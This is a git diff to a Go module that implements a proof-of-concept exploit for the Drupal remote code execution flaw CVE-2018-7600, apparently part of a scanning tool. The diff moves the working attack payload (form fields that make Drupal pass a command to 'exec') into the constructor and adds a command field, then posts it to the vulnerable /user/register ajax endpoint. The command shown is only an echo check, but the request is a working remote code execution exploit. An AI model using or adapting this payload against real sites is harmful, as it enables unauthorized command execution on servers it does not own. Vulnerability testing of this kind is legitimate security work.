@@ -13,12 +13,22 @@ import (
 // DrupalRCE - CVE-2018-7600
 type DrupalRCE struct {
 	target      string
+	cmd         string
+	payload     url.Values
 	Exploitable bool
 }
 
 // NewDrupalRCE .
 func NewDrupalRCE() *DrupalRCE {
-	return &DrupalRCE{}
+	return &DrupalRCE{
+		payload: url.Values{
+			"form_id":              {"user_register_form"},
+			"_drupal_ajax":         {"1"},
+			"mail[#post_render][]": {"exec"},
+			"mail[#type]":          {"markup"},
+			"mail[#markup]":        {`echo "AssassinGooo"`},
+		},
+	}
 }
 
 // Info implements PoC interface.
@@ -49,20 +59,12 @@ func (d *DrupalRCE) Run() {
 }
 
 func (d *DrupalRCE) check() {
-	cmd := `echo "AssassinGooo"`
-	payload := url.Values{}
-	payload.Add("form_id", "user_register_form")
-	payload.Add("_drupal_ajax", "1")
-	payload.Add("mail[#post_render][]", "exec")
-	payload.Add("mail[#type]", "markup")
-	payload.Add("mail[#markup]", cmd)
-
 	client := &http.Client{
 		Timeout: 5 * time.Second,
 	}
 	req, err := http.NewRequest("POST",
 		"http://"+d.target+"/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
-		strings.NewReader(payload.Encode()))
+		strings.NewReader(d.payload.Encode()))
 	if err != nil {
 		logger.Red.Println(err)
 		return
